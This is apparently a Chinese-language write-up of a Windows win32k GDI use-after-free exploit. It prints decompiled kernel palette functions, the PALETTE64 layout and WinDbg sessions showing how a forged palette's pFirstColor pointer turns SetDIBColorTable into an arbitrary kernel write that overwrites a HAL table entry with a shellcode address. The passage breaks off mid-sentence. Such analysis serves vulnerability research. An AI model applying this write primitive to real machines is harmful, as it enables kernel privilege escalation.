
```
\_\_int64 \_\_fastcall NtGdiDoPalette(\_\_int64 hdc, unsigned \_\_int16 iStart, unsigned \_\_int16 cEntries, RGBQUAD \*prgbq, unsigned int value5, int value1)
{
RGBQUAD \*prgbqRef; // r12
signed int Low\_cEntries; // ebx
unsigned int hr; // er14
int flag; // er13
void \*buff; // rsi
\_\_int64 GreSetDIBColorTable\_Offset; // rax
unsigned \_\_int64 prg\_Low; // rax
signed int hrtemp; // eax
size\_t v14; // r8
\_\_int64 hdcRef; // [rsp+70h] [rbp+8h]
unsigned \_\_int16 iStartRef; // [rsp+78h] [rbp+10h]
iStartRef = iStart;
hdcRef = hdc;
prgbqRef = prgbq;
LOWORD(Low\_cEntries) = cEntries;
hr = 0;
flag = 1;
buff = 0i64;
GreSetDIBColorTable\_Offset = value5;
if ( value5 > 5 )
return hr;
// 如果传进来的不是1
if ( !value1 )
{
if ( prgbq )
{
if ( cEntries )
{
if ( cEntries <= 0x9C4000ui64 )
{
// 分配buff
buff = (void \*)AllocFreeTmpBuffer(4 \* (unsigned int)cEntries);
iStart = iStartRef;
}
flag = buff != 0i64 ? 1 : 0;
hdc = hdcRef;
GreSetDIBColorTable\_Offset = value5;
}
else
{
flag = 0;
}
}
if ( flag )
{
Low\_cEntries = (unsigned \_\_int16)Low\_cEntries;
// 调用GreSetDIBColorTable
hrtemp = ((\_\_int64 (\_\_fastcall \*)(\_\_int64, \_QWORD, \_QWORD, void \*))\*(&palfun + GreSetDIBColorTable\_Offset))(
hdc,
iStart,
(unsigned \_\_int16)Low\_cEntries,
buff);
hr = hrtemp;
if ( (unsigned \_\_int16)Low\_cEntries < hrtemp )
hrtemp = Low\_cEntries;
if ( hrtemp > 0 && prgbqRef )
{
v14 = hrtemp;
if ( &prgbqRef[v14] > W32UserProbeAddress || &prgbqRef[v14] <= prgbqRef )
\*(\_BYTE \*)W32UserProbeAddress = 0;
memmove(prgbqRef, buff, v14 \* 4);
}
}
goto LABEL\_27;
}
if ( cEntries <= 0u )
{
// 实际上都是调用GreSetDIBColorTable\_Offset
LABEL\_11:
hr = ((\_\_int64 (\_\_fastcall \*)(\_\_int64, \_QWORD, \_QWORD, void \*))\*(&palfun + GreSetDIBColorTable\_Offset))(
hdc,
iStart,
(unsigned \_\_int16)Low\_cEntries,
buff);
LABEL\_27:
if ( buff )
FreeTmpBuffer(buff);
return hr;
}
if ( cEntries <= 0x9C4000ui64 )
// 分配堆
buff = (void \*)AllocFreeTmpBuffer(4 \* (unsigned int)cEntries);
if ( !buff )
return hr;
prg\_Low = (unsigned \_\_int64)&prgbqRef[(unsigned \_\_int16)Low\_cEntries];
if ( prg\_Low > (unsigned \_\_int64)W32UserProbeAddress || prg\_Low <= (unsigned \_\_int64)prgbqRef )
\*(\_BYTE \*)W32UserProbeAddress = 0;
memmove(buff, prgbqRef, 4i64 \* (unsigned \_\_int16)Low\_cEntries);
iStart = iStartRef;
hdc = hdcRef;
// 这里又到了lable1执行GreSetDIBColorTable
GreSetDIBColorTable\_Offset = value5;
goto LABEL\_11;
}
\_\_int64 \_\_fastcall GreSetDIBColorTable(HDC hdc, unsigned int iStart, int Low\_cEntries, tagRGBQUAD \*prgbq)
{
unsigned int v4; // esi
tagRGBQUAD \*v5; // rbp
int v6; // er12
unsigned int iret; // edi
XEPALOBJ \*v8; // rbx
SURFACE \*surf; // rdx
\_\_int64 xpLookup; // rax
int iLast; // edi
\_\_int64 xp; // [rsp+20h] [rbp-68h]
XEPALOBJ \*xpobjFrom; // [rsp+28h] [rbp-60h]
int v15; // [rsp+30h] [rbp-58h]
int v16; // [rsp+34h] [rbp-54h]
\_\_int64 devLock; // [rsp+38h] [rbp-50h]
\_\_int64 v18; // [rsp+40h] [rbp-48h]
\_\_int64 v19; // [rsp+48h] [rbp-40h]
int v20; // [rsp+50h] [rbp-38h]
\_\_int64 v21; // [rsp+58h] [rbp-30h]
int v22; // [rsp+60h] [rbp-28h]
int v23; // [rsp+64h] [rbp-24h]
// poc中istart为0
v4 = iStart;
v5 = prgbq;
v6 = Low\_cEntries;
iret = 0;
xpobjFrom = 0i64;
v15 = 0;
v16 = 0;
XDCOBJ::vLock((XEPALOBJ \*)&xpobjFrom, hdc);
v8 = xpobjFrom;
if ( xpobjFrom )
{
v21 = 0i64;
v22 = 0;
v23 = 0;
devLock = 0i64;
v18 = 0i64;
v19 = 0i64;
v20 = 0;
DEVLOCKOBJ::bPrepareTrgDco((DEVLOCKOBJ \*)&devLock, 0i64);
DEVLOCKOBJ::vLockNoDrawing((DEVLOCKOBJ \*)&devLock, (struct XDCOBJ \*)&xpobjFrom);
surf = SURFACE::pdibDefault;
if ( v8->field\_1F8 )
surf = (SURFACE \*)v8->field\_1F8;
if ( surf->field\_64 || !surf->field\_B8 || (unsigned int)(surf->field\_60 - 1) > 2 )
{
EngSetLastError(6);
}
else
{
\*(\_DWORD \*)(v8->field\_50 + 8) |= 0xFu;
// 0x78偏移量,surf->xpobj实际上就是hdc内核对象xpobjFrom
xpLookup = surf->xpobj;
xp = xpLookup;
// 0x1C是xp的索引
if ( v4 < \*(\_DWORD \*)(xpLookup + 0x1C) )
{
iLast = v4 + v6;
// 如果要查找的entry索引大于xp的索引界限字段,last就赋值为xp的索引界限字段值
if ( v4 + v6 > \*(\_DWORD \*)(xpLookup + 0x1C) )
iLast = \*(\_DWORD \*)(xpLookup + 0x1C);
iret = iLast - v4;
XEPALOBJ::vCopy\_rgbquad((XEPALOBJ \*)&xp, v5, v4, iret);
}
}
DEVLOCKOBJ::vDestructor((DEVLOCKOBJ \*)&devLock);
}
else
{
EngSetLastError(6);
}
if ( !v8 )
return iret;
XDCOBJ::RestoreAttributes((XDCOBJ \*)&xpobjFrom);
\_InterlockedAdd(&xpobjFrom->flag, 0xFFFFFFFF);
return iret;
}
```

这里`xp`是一个`PALETTE64`结构正确逆向结果如下,`vCopy_rgbquad`函数向`xp`的`+0x80+(4*iStartRef)`处写入3个字节也就是`PALETTEENTRY`的rbg3种颜色,可以由用户控制,这里`iStartRef`是索引值为0

```
typedef struct PALETTEENTRY{
\_BYTE peRed;
\_BYTE peGreen;
\_BYTE peBlue;
\_BYTE peFlags;
}
#pragma pack(push, 4)
typedef struct \_PALETTE64
{
\_BYTE BaseObject[24]; // 0x00
ULONG flPal; // 0x18
ULONG cEntries; // 0x1c
ULONG ulTime; // 0x20
ULONG64 hdcHead; // 0x28
ULONG64 hSelected; // 0x30
ULONG64 cRefhpal; // 0x38
ULONG cRefRegular; // 0x3c
ULONG64 ptransFore; // 0x40
ULONG64 ptransCurrent; // 0x48
ULONG64 ptransOld; // 0x50
ULONG64 unk\_038; // 0x58
ULONG64 pfnGetNearest; // 0x60
ULONG64 pfnGetMatch; // 0x68
ULONG64 ulRGBTime; // 0x70
ULONG64 pRGBXlate; // 0x78
PALETTEENTRY \*pFirstColor; // 0x80
struct \_PALETTE \*ppalThis; // 0x88
PALETTEENTRY apalColors[3]; // 0x90
}PALETTE64 ;
#pragma pack(pop)
void \_\_fastcall XEPALOBJ::vCopy\_rgbquad(PALETTE64 \*this, tagRGBQUAD \*prgbq, unsigned int iStart, int iret)
{
\_\_int64 iStartRef; // rbx
PALETTE64 \*that; // r8
BYTE \*writeBuff; // r10
BYTE blue; // al
bool EndIret; // zf
signed \_\_int32 XlatePalUnique; // ecx
\_\_int64 xpRef; // rdx
iStartRef = iStart;
that = this;
// StartRef和iret这里为0,就是pFirstColor
writeBuff = (BYTE \*)(\*(\_QWORD \*)(\*(\_QWORD \*)this->BaseObject + 0x80i64) + 4 \* iStartRef);
// 这里就是设置\*(DWORD \*)(XEPALOBJ + 0x1C) = 1的原因
if ( (unsigned int)(iStartRef + iret) > \*(\_DWORD \*)(\*(\_QWORD \*)this->BaseObject + 0x1Ci64) )
// 0x1C就是xp的索引
iret = \*(\_DWORD \*)(\*(\_QWORD \*)this->BaseObject + 0x1Ci64) - iStartRef;
if ( iret )
{
do
{
// 最后一个字节写入为0
writeBuff[3] = 0;
blue = prgbq->rgbBlue;
++prgbq;
// 第三个字节写入
writeBuff[2] = blue;
// 写入第一个字节
\*writeBuff = prgbq[-1].rgbRed;
writeBuff += 4;
EndIret = iret-- == 1;
// +4-3=1写入第二个字节
\*(writeBuff - 3) = prgbq[-1].rgbGreen;
}
while ( !EndIret );
}
XlatePalUnique = \_InterlockedIncrement((volatile signed \_\_int32 \*)&ulXlatePalUnique);
\*(\_DWORD \*)(\*(\_QWORD \*)that->BaseObject + 0x20i64) = XlatePalUnique;
// 这里需要设置\*(ULONGLONG \*\*)(XEPALOBJ + 0x88) = &tmp;和xp+0x88相同的值
xpRef = \*(\_QWORD \*)(\*(\_QWORD \*)that->BaseObject + 0x88i64);
if ( xpRef != \*(\_QWORD \*)that->BaseObject )
\*(\_DWORD \*)(xpRef + 0x20) = XlatePalUnique;
}
```

下面我们看调试来验证这个结果:

`surf->xpobj`就是uaf的gdi对象相对于`AcceleratorTableW+0x78`偏移量位置的对,也就是最终被任意位置写入内存的对象,

在内核态查看:

```
kd> dq FFFFF900c3041cc0+78h
//看到xp=00000000`020f0d50
fffff900`c3041d38 00000000`020f0d50 12344444`00081234
fffff900`c3041d48 00081234`44440008 44440008`12344444
fffff900`c3041d58 12344444`00081234 00081234`44440008
fffff900`c3041d68 44440008`12344444 12344444`00081234
kd> dq 00000000`020f0d50+80h
//这里指定的就是hal地址
00000000`020c0dd0 fffff800`03e43c68 00000000`001dbb18
00000000`020c0de0 00000000`00000000 00000000`fdfdfdfd
00000000`020c0df0 00000000`00000000 0c1d2361`21bb903c
00000000`020c0e00 00000000`020c0d20 00000000`00000000
kd> dq fffff800`03e43c68
//原值为fffff800`00000000
fffff800`03e43c68 fffff800`00000000 fffff800`03c43470
fffff800`03e43c78 fffff800`04041f20 00000000`00000000
fffff800`03e43c88 fffff800`03d1c2f0 fffff800`03ff4044
fffff800`03e43c98 fffff800`03ff4990 fffff800`041310d0
fffff800`03e43ca8 fffff800`03d00090 fffff800`03cc4510
fffff800`03e43cb8 fffff800`03cc4510 fffff800`03c41ca4
fffff800`03e43cc8 fffff800`03c42e88 fffff800`03c17534
fffff800`03e43cd8 fffff800`03c41c18 fffff800`04041f20
```

继续运行程序至以下代码,然后在用户态查看:

```
执行\*(LONGLONG \*)(XEPALOBJ + 0x80) = (LONGLONG)(hal + 8);
SetDIBColorTable(hdc, 0, 1, &prgbq)后
0:000> dv /i /t /v
//dal地址
prv local 00000000`001df9f8 unsigned int64 hal = 0xfffff800`03e43c60
//shellcode地址
prv local 00000000`001dfa00 unsigned int64 target = 0x00000001`3fe7123a
```

再回到内核态查看
